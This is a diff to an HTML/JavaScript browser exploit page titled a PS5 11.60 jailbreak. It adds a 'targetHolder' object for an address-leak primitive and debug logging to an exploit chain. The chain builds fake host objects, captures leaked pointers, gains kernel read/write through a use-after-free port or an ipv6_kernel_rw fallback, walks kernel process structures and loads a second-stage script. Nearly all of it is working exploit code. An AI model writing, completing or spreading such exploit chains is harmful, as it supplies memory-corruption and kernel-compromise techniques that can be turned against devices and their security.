@@ -1,7 +1,7 @@
 <!doctype html>
 <!--
   PS5 11.60 Jailbreak – ARW exploit + ported poops.jar (UAF-based kernel R/W)
-  with fallback to ipv6_kernel_rw if the UAF fails.
+  with fallback to ipv6_kernel_rw.
 -->
 <meta charset="utf-8"><title>PS5 11.60 Jailbreak</title>
 <body style="font:13px monospace"><pre id="out"></pre>
@@ -9,7 +9,7 @@
 "use strict";
 
 // ============================================================
-// 1. ORIGINAL ARW EXPLOIT (UNCHANGED)
+// 1. ORIGINAL ARW EXPLOIT (with targetHolder fix)
 // ============================================================
 var Q = new URLSearchParams(location.search);
 var requestedDrain = parseInt(Q.get("n") || "512", 10);
@@ -54,6 +54,7 @@ var fakeHost = null;
 var lengthWord = null;
 var fillerGraph = null;
 var outerGraph = null;
+var targetHolder = null;
 
 var leakedScope = null;
 var getterCarrier = null;
@@ -199,6 +200,29 @@ function buildFakeHost() {
         || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
         || targetView[0] !== 0xa5)
         throw new Error("fake-host-shape-failed");
+
+    // Create targetHolder for base leak
+    var arenaBuffer = new ArrayBuffer(0x1000);
+    var arenaView = new Uint8Array(arenaBuffer);
+    arenaView[0xf00] = 0x52;
+    arenaView[0xf01] = 0x4f;
+    arenaView[0xf02] = 0x50;
+    arenaView[0xf03] = 0x31;
+    var realCollator = new Intl.Collator("en", { usage: "search" });
+    var compareFn = realCollator.compare;
+    if (!(compareFn("a", "b") < 0))
+        throw new Error("collator-prewarm-failed");
+    var holderGuardA = { marker: 0x484f4c44 };
+    var holderGuardB = { marker: 0x47554152 };
+    targetHolder = {
+        q0: parseInt,
+        q1: arenaView,
+        q2: realCollator,
+        q3: compareFn,
+        q4: holderGuardA,
+        q5: holderGuardB
+    };
+    window.targetHolder = targetHolder; // make it global for addrof
 }
 
 function buildAndStoreGraph() {
@@ -237,8 +261,6 @@ function prepareAddrof() {
     getterCarrier[1] = targetView;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetView;
-    // We'll add targetHolder later after buildFakeHost creates it.
-    // We'll assign it globally.
     getterCarrier[4] = window.targetHolder;
     getterCarrier[5] = window.targetHolder;
     mark("ADDROF-CARRIER-DONE", "host-target-host-target-holder-holder");
@@ -256,6 +278,10 @@ function runAddrofCapture() {
         copiedLength = capturedString.length;
         for (var i = 0; i < 24; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
+        // Debug: log raw captured words
+        var debugWords = [];
+        for (var i = 0; i < 24; i++) debugWords.push(capturedWords[i]);
+        mark("RAW-WORDS", debugWords.join(","));
         captureState = 1;
     } catch (error) {
         captureError = error;
@@ -481,6 +507,7 @@ function loadHistoryCritical() {
         restoreObserved = rwView[0] === 0x3c
             && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
 
+        // --- Save candidate for later use ---
         g_candidate = candidate;
         candidate = null;
         clearPredecessor();
@@ -539,7 +566,7 @@ function dumpHex(bytes) {
 }
 
 // ============================================================
-// 2. HELPER FUNCTIONS
+// 2. HELPER FUNCTIONS FOR SECOND STAGE
 // ============================================================
 function aimCarrier(candidate, address) {
     var high = Math.floor(address / 0x100000000);
@@ -641,7 +668,6 @@ function findCurproc() {
 // ============================================================
 async function runPoops() {
     mark("POOPS-START", "porting poops.jar to JavaScript");
-    // Ensure SYSCALL is defined
     if (!window.SYSCALL) {
         window.SYSCALL = {
             getpid: 20n,
@@ -789,7 +815,6 @@ function loadSecondStage() {
         };
         script.onerror = function() {
             mark("RUNTIME-LOAD-FAIL", "could not load lapse-runtime.js");
-            // fallback to ipv6_kernel_rw if available
             if (window.ipv6_kernel_rw) {
                 doInjectionFallback();
             }
@@ -803,7 +828,6 @@ function loadSecondStage() {
 // Fallback: use the simpler ipv6_kernel_rw method
 function doInjectionFallback() {
     mark("FALLBACK", "using ipv6_kernel_rw");
-    // Same as previous doInjection
     const curproc = findCurproc();
     if (curproc === 0n) { mark("FALLBACK-CURPROC-FAIL"); return; }
     const proc_fd = window.read64(curproc + 0x48n);
@@ -956,6 +980,7 @@ function beginComposition() {
         return;
     }
 
+    // Parse 6 pointers: host, target, host2, target2, holder, holder2
     var a0 = pointerFromWords(capturedWords, 0);
     var b0 = pointerFromWords(capturedWords, 4);
     var a1 = pointerFromWords(capturedWords, 8);
